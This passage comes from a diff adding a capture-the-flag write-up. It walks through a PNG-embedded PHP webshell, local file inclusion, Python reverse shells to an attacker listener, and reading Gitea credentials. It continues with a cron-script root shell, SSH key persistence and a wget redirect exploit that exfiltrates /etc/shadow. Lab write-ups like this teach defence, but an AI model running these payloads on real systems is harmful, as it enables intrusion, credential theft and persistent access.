class=&quot;s1&quot;&gt;'height'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;imagepng&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;upload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+ &lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Image uploaded successfully.&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+ &lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Problem in uploading image files.&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Namely,&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;The file has to have a &lt;strong&gt;&amp;quot;.png&amp;quot;&lt;/strong&gt; extension&lt;/li&gt;
+&lt;li&gt;The file has to be &amp;lt;= 2MB&lt;/li&gt;
+&lt;li&gt;The has to have a &lt;strong&gt;&amp;quot;image/png&amp;quot;&lt;/strong&gt; mimetype&lt;/li&gt;
+&lt;li&gt;The image gets processed through &lt;strong&gt;&amp;quot;imagecopyresampled&amp;quot;&lt;/strong&gt; and &lt;strong&gt;&amp;quot;imagecreatefromstring&amp;quot;&lt;/strong&gt; before being written to disk&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Now, if it weren't for the 4th rule, this would be a piece of cake. Simply grab a PNG, concatenate a PHP webshell onto the end of the file and rename it to end with &lt;strong&gt;&amp;quot;.php.png&amp;quot;&lt;/strong&gt; to have the PHP code within it processed by the web server (Apache/NGINX). Unfortunately, that's not the case, and we need to find a way to bypass these transformations of our file. This is where &lt;a href=&quot;https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/&quot;&gt;Encoding Web Shells in PNG IDAT chunks&lt;/a&gt; comes to the rescue. This is a seriously cool exploit accompanied by a well written blog post, as well as an &lt;a href=&quot;https://www.idontplaydarts.com/images/phppng.png&quot;&gt;example PNG file&lt;/a&gt;. The TL;DR of the exploit is, we encode &lt;code&gt;&amp;lt;?=$_GET[0]($_POST[1]);?&amp;gt;&lt;/code&gt; into the PNG file in such a way so that it remains in the file after the image transformations (in this case, resizing to 32x32). So now we can upload our web shell.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/b4upload.png&quot; alt=&quot;workingupload&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/uploadsuccess.png&quot; alt=&quot;uploadsuccess&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;accessing-the-web-shell&quot;&gt;Accessing the web shell&lt;/h2&gt;
+&lt;p&gt;So we managed to upload a web shell, but now we need a way to access it. We can GET/POST to it with the necessary parameters and data, but since it's just an image, the web server won't process the PHP inside the image.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ curl 172.30.0.2/blog/uploads/shell.php.png?0=shell_exec --data &amp;quot;1=ls&amp;quot; --output - &amp;amp;&amp;amp; echo
+�PNG
+▒
+IHDR �▒�� pHYs���+IDATH�c\&amp;lt;?=$_GET[0]($_POST[1]);?&amp;gt;X����s^7�����~_�}�'���ɿ_�|�00cٹg��=2��Q0
+F�(▒�`��Q0
+��
+IEND�B`�
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There are 2 ways around this:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Trick the web server into responding with a different &lt;code&gt;Content-Type&lt;/code&gt; HTTP header&lt;/li&gt;
+&lt;li&gt;Include the image into a web page that has the correct &lt;code&gt;Content-Type&lt;/code&gt; HTTP header&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Now, remember that get parameter &lt;strong&gt;&amp;quot;blog.php?article=1&amp;quot;&lt;/strong&gt; we saw earlier? Turns out we can get local file inclusion (LFI) through it, if we look once again at some more &lt;a href=&quot;https://github.com/Michael-SharkyMaster/website/blob/master/blog.php&quot;&gt;source code&lt;/a&gt;. The vulnerable code is the following:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'blog_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/blog/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This means if our file has &amp;quot;blog_&amp;quot; and &amp;quot;html&amp;quot; in its name, it will get included. So, if we rename our file from &lt;code&gt;shell.php.png&lt;/code&gt; to &lt;code&gt;blog_html_shell.php.png&lt;/code&gt;, then we will be able to include it via LFI!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/renamedupload.png&quot; alt=&quot;renamedupload&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ curl 172.30.0.2/blog.php?article=uploads/blog_html_shell.php.png --output - &amp;amp;&amp;amp; echo
+�PNG
+▒
+IHDR �▒�� pHYs���+IDATH�c\
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Wicked! We successfully included it into blog.php, and we notice there is no &lt;code&gt;&amp;lt;?=$_GET[0]($_POST[1]);?&amp;gt;&lt;/code&gt; in the result, meaning the PHP was processed! We can verify we have remote code execution (RCE) by sending &lt;code&gt;0=shell_exec&lt;/code&gt; as our get parameter, and &lt;code&gt;1=ls&lt;/code&gt; as our post parameter.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ curl &amp;quot;172.30.0.2/blog.php?article=uploads/blog_html_shell.php.png&amp;amp;0=shell_exec&amp;quot; --data &amp;quot;1=ls&amp;quot; --output - &amp;amp;&amp;amp; echo
+�PNG
+▒
+IHDR �▒�� pHYs���+IDATH�c\52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180
+admin
+blog
+blog.html
+blog.php
+css
+errors
+icon-fonts
+img
+index.html
+js
+X����s^7�����~_�}�'���ɿ_�|�00cٹg��=2��Q0
+F�(▒�`��Q0
+��
+IEND�B`�&amp;lt;center&amp;gt;&amp;lt;a href=&amp;quot;https://github.com/Michael-SharkyMaster/website&amp;quot;&amp;gt;This website is also host on Github&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Voila!&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&quot;getting-a-shell&quot;&gt;Getting a shell&lt;/h2&gt;
+&lt;p&gt;Now that we have RCE, getting a shell is easy! First, find a way to get a reverse shell, which in this case, was to verify Python was installed.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ curl &amp;quot;172.30.0.2/blog.php?article=uploads/blog_html_shell.php.png&amp;amp;0=shell_exec&amp;quot; --data &amp;quot;1=which python&amp;quot; --output - &amp;amp;&amp;amp; echo�PNG
+▒
+IHDR �▒�� pHYs���+IDATH�c\/usr/bin/python
+X����s^7�����~_�}�'���ɿ_�|�00cٹg��=2��Q0
+F�(▒�`��Q0
+��
+IEND�B`�&amp;lt;center&amp;gt;&amp;lt;a href=&amp;quot;https://github.com/Michael-SharkyMaster/website&amp;quot;&amp;gt;This website is also host on Github&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next, set up a netcat listener with &lt;code&gt;nc -lnvp 4444&lt;/code&gt; and finally send a Python reverse shell as our payload!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ curl '172.30.0.2/blog.php?0=shell_exec&amp;amp;article=uploads/blog_html_shell.php.png' --data &amp;quot;1=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;172.30.0.14\&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/sh\&amp;quot;,\&amp;quot;-i\&amp;quot;]);'&amp;quot; --output -
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [172.30.0.14] from (UNKNOWN) [172.30.0.2] 42404
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&quot;user-2&quot;&gt;User 2&lt;/h1&gt;
+&lt;p&gt;Cool, so we got our shell. Unfortunately there's still a little bit to go to get the elusive user flag. At the moment, we're &lt;code&gt;www-data&lt;/code&gt; but we need to privesc to the &lt;code&gt;git&lt;/code&gt; user. After doing some standard enumeration, we find some credentials in &lt;code&gt;/etc/gitea/app.ini&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ cat /etc/gitea/app.ini
+APP_NAME = Gitea: Git with a cup of tea
+RUN_USER = git
+RUN_PASSWD = B33r_Bamboo_Michael
+RUN_MODE = prod
+
+[oauth2]
+JWT_SECRET = oUqiXymhOjxmvtHWNYVilt4QNWMvLGVwDd3V_CnYqsk
+
+[security]
+INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE1ODY4Nzk4NzZ9.UAB_BOzaC0N3jz_t1prqY_Ipo1neSs7pxqnxnO8f1XA
+INSTALL_LOCK = true
+SECRET_KEY = LJlnrqXYDJEstw7sZbu9R9EQzHisotxe3br8TYwnIsr8qzkWHp1tfOgy8p7lRvR0
+
+[database]
+DB_TYPE= mysql
+HOST = 127.0.0.1:3306
+NAME = gitea
+USER = gitea
+PASSWD = B33r_Bamboo_Michael
+SSL_MODE = disable
+CHARSET= utf8
+PATH = /var/lib/gitea/data/gitea.db
+
+... (redacted)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Testing out the new credentials, we SSH in as git and get the user flag!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ ssh git@172.30.0.2
+git@172.30.0.2's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.19.0-6-amd64 x86_64)
+
+ * Documentation:https://help.ubuntu.com
+ * Management: https://landscape.canonical.com
+ * Support:https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+git@221f69d2ea9c:~$ ls
+gitea-repositoriesnote.txtuser.txt
+git@221f69d2ea9c:~$ cat user.txt
+shkCTF{juSt_h4v3_t0_pr1v3sc_n0w_6bb4369a853e943339aab363e22869cd}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
+&lt;p&gt;Now we begin the somewhat easy path to root.&lt;/p&gt;
+&lt;h2 id=&quot;enum&quot;&gt;Enum&lt;/h2&gt;
+&lt;p&gt;Proceeding with standard enumeration, I checked out what was in &lt;code&gt;/var/www/html&lt;/code&gt; and noticed a strange directory, with a file called &lt;strong&gt;&amp;quot;backup.zip&amp;quot;&lt;/strong&gt; that was made in the same minute.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git@221f69d2ea9c:/var/www/html$ ls
+52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180adminblogblog.htmlblog.phpcsserrorsicon-fontsimgindex.htmljs
+git@221f69d2ea9c:/var/www/html$ ls -lA 52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180/
+total 28
+-rw-r--r-- 1 root root 24641 May 15 08:27 backup.zip
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So I immediately checked out what was running in cron and sure enough:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git@221f69d2ea9c:/var/www/html$ cat /etc/cron.d/backup
+SHELL=/bin/bash
+* * * * * /usr/bin/python -c &amp;quot;import backup;backup.backup('/var/www/html/blog', '/var/www/html/52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180/backup.zip').run()&amp;quot; 2&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When I Googled the &lt;strong&gt;&amp;quot;backup&amp;quot;&lt;/strong&gt; module, I did not find anything, so instead I searched the box for it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git@221f69d2ea9c:/var/www/html$ find / -iname backup.py 2&amp;gt;/dev/null
+/etc/python2.7/backup.py
+git@221f69d2ea9c:/var/www/html$ ls -lA /etc/python2.7/backup.py
+-rwxrw---- 1 root git 508 Apr 17 00:59 /etc/python2.7/backup.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;
+&lt;p&gt;Turns out, we have write permissions to this file! Since it runs as root, we can simply add a python reverse shell into the &lt;code&gt;run&lt;/code&gt; method and get root.txt!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git@221f69d2ea9c:/var/www/html$ cat /etc/python2.7/backup.py
+import os, socket, subprocess
+import zipfile
+
+class backup():
+def __init__(self, folder_in, folder_out):
+self.__folder_in = folder_in
+self.__zip_out = folder_out
+self.__zipf = zipfile.ZipFile(self.__zip_out, 'w', zipfile.ZIP_DEFLATED)
+
+def __zipdir(self, ziph):
+for root, dirs, files in os.walk(self.__folder_in):
+for file in files:
+self.__zipf.write(os.path.join(root, file))
+
+def run(self):
+self.__zipdir(self.__zipf)
+self.__zipf.close()
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&amp;quot;172.30.0.14&amp;quot;,4445))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;])
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now simply setup a listener and get that flag!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ nc -lnvp 4445
+listening on [any] 4445 ...
+connect to [172.30.0.14] from (UNKNOWN) [172.30.0.2] 59254
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cat /root/root.txt
+GG! Hope you liked this challenge, don't hesitate to DM me @_magnussen_ on Twitter to tell me what you thought about it.
+
+shkCTF{w0w_y0u'r3_4_Tru3_h4ck3r_b4c2679666641be61feb6919e83f2777}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&quot;root-2&quot;&gt;Root 2&lt;/h1&gt;
+&lt;p&gt;Last but not least, there is another flag &lt;em&gt;somewhere&lt;/em&gt;.&lt;/p&gt;
+&lt;h2 id=&quot;making-life-better&quot;&gt;Making life better&lt;/h2&gt;
+&lt;p&gt;Before we begin looking for it, I want to be able to login as root on 172.30.0.2 through SSH to make life easy, so let's do that. In the same root shell, I add my public SSH key to the list of authorized keys&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mkdir /root/.ssh
+# echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLWcwHbrg+N7XnxYhpgjDWYoRFx8/qjcmBk+clsIqwsrGSBRnZSPRAxkQ9cY8O2ImuHJ0PU7vsMhRtyYX1cFh8qaWJsVBDDnGYlxGExqD7wdT/i+1xbusFcv5FqSPDorJKmZSju8dA+sxMEkqSOw8Z28cSs8zpngYyktPkuyKCvA0mE7D27WeMGVpjrHKymwmH+maDMjXNs6mCf/7Hg4+WQSM5neOtqk6tHrlqyNLlr+sEtRoJdAYj6GDFupIDsK/low7m/InbV7IWAPZEeQ4qZTaIBoXqysmzxH5VlFR91sxcrICvYQnOGK4nJWDtZauf2TDoONYq4mbKIPgGp2YvTGGv9i+nJAUfx0PzaCH9J5l5Z1Q6HSHD7o6qB5hNEZl7rrQwRn1Oy9uOB7dzvqDyKgBUMwGB8/BTUk654XkwwCIAyxW5nisnDDTY5wJPFFogdDeGJg52HJYSayAonsukZS16iFbZxLcjsyB8dKFdTCWXgdSbtQxkVp7vmnyOzpk= kali@kali&amp;quot; &amp;gt; /root/.ssh/authorized_keys
+# sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
+# /etc/init.d/ssh restart
+ * Restarting OpenBSD Secure Shell server sshd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;enum-1&quot;&gt;Enum&lt;/h2&gt;
+&lt;p&gt;Now that that's out of the way, we can begin looking for the final flag. Reusing the credentials &amp;quot;michael:B33r_Bamboo_Michael&amp;quot; we log in to the other machine on the network, &lt;strong&gt;172.30.0.3&lt;/strong&gt;, with SSH, and we begin doing our enumeration.&lt;/p&gt;
+&lt;p&gt;Once again, we find a mysterious cron job:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;michael@0a1f126e7beb:~$ cat /etc/cron.d/backup_website 
+SHELL=/bin/bash
+*/1 * * * * wget -N http://172.30.0.2/52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180/backup.zip 2&amp;gt;&amp;amp;1
+#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Unfortunately, this is as far as our team got during the 48 hour CTF, as by the time we reached this point there was only a couple hourse left and we all needed sleep. Since then, I learnt the final exploit to privesc to root 2, and it involves the following &lt;a href=&quot;https://www.exploit-db.com/exploits/40064&quot;&gt;wget exploit&lt;/a&gt; that allows for RCE.&lt;/p&gt;
+&lt;h2 id=&quot;explaining-the-exploit&quot;&gt;Explaining the exploit&lt;/h2&gt;
+&lt;p&gt;This is a bit of a complicated exploit, but I will break it down into two steps.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;wget makes a request to a host we control. The reason why this is dangerous is because this version of wget will blindly follow redirects, and even better than that it doesn't preserve the name of the originally requested file, meaning we can write arbitrary files with arbitrary contents to the current directory from which wget is run. In the case of a cron job, that current directory is the home folder of the user running the cron job which in this instance, is &lt;code&gt;/root&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;wget can be configured to do special things by placing a &lt;code&gt;.wgetrc&lt;/code&gt; file in the user's home directory. For instance, we can get it to post a file to us with &lt;code&gt;post_file = $FILE&lt;/code&gt;. We can also control where the response to the wget is written to, with &lt;code&gt;output_document = $FILE&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Pieceing the two together, allows us to:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Post /etc/shadow to us, and even better&lt;/li&gt;
+&lt;li&gt;Install a cron job to give us a root shell&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;So let's do it!&lt;/p&gt;
+&lt;h2 id=&quot;executing-the-exploit&quot;&gt;Executing the exploit&lt;/h2&gt;
+&lt;p&gt;First, we set up a FTP server to serve our malicious &lt;code&gt;.wgetrc&lt;/code&gt; file. &lt;strong&gt;Note:&lt;/strong&gt; we can't serve it over HTTP since we are going to be redirecting HTTP requests!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@221f69d2ea9c:~# mkdir /tmp/ftptest
+root@221f69d2ea9c:~# echo -e &amp;quot;post_file = /etc/shadow\noutput_document = /etc/cron.d/wget-root-shell&amp;quot; &amp;gt; /tmp/ftptest/.wgetrc
+root@221f69d2ea9c:~# cat /tmp/ftptest/.wgetrc 
+post_file = /etc/shadow
+output_document = /etc/cron.d/wget-root-shell
+root@221f69d2ea9c:~# cd /tmp/ftptest
+root@221f69d2ea9c:/tmp/ftptest# python -m pyftpdlib -p21 -w
+/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
+RuntimeWarning)
+[I 2020-05-15 09:34:39] concurrency model: async
+[I 2020-05-15 09:34:39] masquerade (NAT) address: None
+[I 2020-05-15 09:34:39] passive ports: None
+[I 2020-05-15 09:34:39] &amp;gt;&amp;gt;&amp;gt; starting FTP server on 0.0.0.0:21, pid=241 &amp;lt;&amp;lt;&amp;lt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next, we set up our malicious HTTP Server. &lt;strong&gt;Note:&lt;/strong&gt; Since the cron job is running &lt;code&gt;wget -N&lt;/code&gt; which checks for differences in timestamps between the local and remote file with HEAD requests, we will need to modify the script to work for HEAD requests.&lt;/p&gt;
+&lt;p&gt;We can clone the &lt;code&gt;do_GET&lt;/code&gt; method from the &lt;a href=&quot;https://www.exploit-db.com/exploits/40064&quot;&gt;original exploit&lt;/a&gt; and simply change it to &lt;code&gt;do_HEAD&lt;/code&gt; as follows&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_HEAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;c1&quot;&gt;# This takes care of sending .wgetrc
+&lt;/span&gt;   
+   &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;We have a volunteer requesting &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; by HEAD :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; 
+   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Wget&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getheader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'User-Agent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;But it's not a Wget :( &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+      &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end_headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
